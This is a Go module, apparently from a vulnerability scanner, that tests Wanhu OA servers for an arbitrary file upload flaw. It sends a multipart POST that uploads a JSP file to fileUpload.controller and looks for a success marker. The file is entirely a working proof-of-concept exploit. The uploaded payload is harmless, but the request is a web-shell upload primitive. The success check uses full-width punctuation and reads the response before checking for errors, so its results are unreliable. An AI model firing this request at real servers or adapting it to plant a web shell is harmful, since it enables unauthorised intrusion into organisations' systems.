package wanhu_fileUpload_controller

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/defaultroot/upload/fileUpload.controller"
	// 构建手动的请求体
	body := "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\r\n"
	body += "Content-Disposition: form-data; name=\"file\"; filename=\"123test.jsp\"\r\n"
	body += "Content-Type: application/octet-stream\r\n"
	body += "Content-Transfer-Encoding: binary\r\n"
	body += "\n"
	body += "<%= \"test123\" %>\n"
	body += "--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0",
			"Accept":       "*/*",
			"Connection":   "Keep-Alive",
		}).
		SetBodyString(body).
		Post(vulnUrl)
	body1 := resp.String()
	if err == nil && resp.StatusCode == 200 {
		return strings.Contains(body1, "\"，\"result\"：\"success\"，\"data")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+08] 万户OA fileUpload.controller 任意文件上传漏洞存在 -> ", url)
	} else {
		color.Red.Println("[+08] 万户OA fileUpload.controller 任意文件上传漏洞不存在")
	}

}
